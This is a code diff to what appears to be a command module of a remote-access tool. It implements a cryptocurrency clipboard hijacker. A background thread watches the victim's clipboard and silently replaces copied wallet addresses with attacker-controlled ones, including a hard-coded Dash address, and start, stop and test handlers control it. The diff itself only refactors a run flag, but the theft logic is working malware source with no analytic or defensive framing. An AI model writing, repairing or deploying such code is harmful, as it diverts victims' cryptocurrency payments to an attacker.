@@ -21,7 +21,7 @@ _REPLACE_ADDRS = {
     "dash": "Xx4Q8g7Jf3Kp9Lm2Nv5Rw8Yb1Cs4Dg6Hj",
 }
 
-_clipper_run = [False]
+_clipper_run = False
 
 def _clip_get():
     try:
@@ -51,20 +51,23 @@ def _replace_addresses(text, overrides=None):
     return replaced, found
 
 def _clipper_thread(overrides):
-    while _clipper_run[0]:
+    global _clipper_run
+    while _clipper_run:
         try:
             text = _clip_get()
             if text:
                 new_text, found = _replace_addresses(text, overrides)
                 if found and new_text != text:
                     _clip_set(new_text)
-        except: pass
+        except:
+            pass
         time.sleep(0.5)
 
 def _cmd_clipper_start(m):
+    global _clipper_run
     try:
-        if _clipper_run[0]: return {"output": "[!] Clipper already running"}
-        _clipper_run[0] = True
+        if _clipper_run: return {"output": "[!] Clipper already running"}
+        _clipper_run = True
         overrides = {}
         for coin in _REPLACEMENTS:
             if coin in m: overrides[coin] = m[coin]
@@ -73,7 +76,8 @@ def _cmd_clipper_start(m):
     except Exception as e: return {"output": f"[!] Clipper error: {e}"}
 
 def _cmd_clipper_stop(m):
-    _clipper_run[0] = False; return {"output": "[+] Crypto clipper stopped"}
+    global _clipper_run
+    _clipper_run = False; return {"output": "[+] Crypto clipper stopped"}
 
 def _cmd_clipper_test(m):
     try:
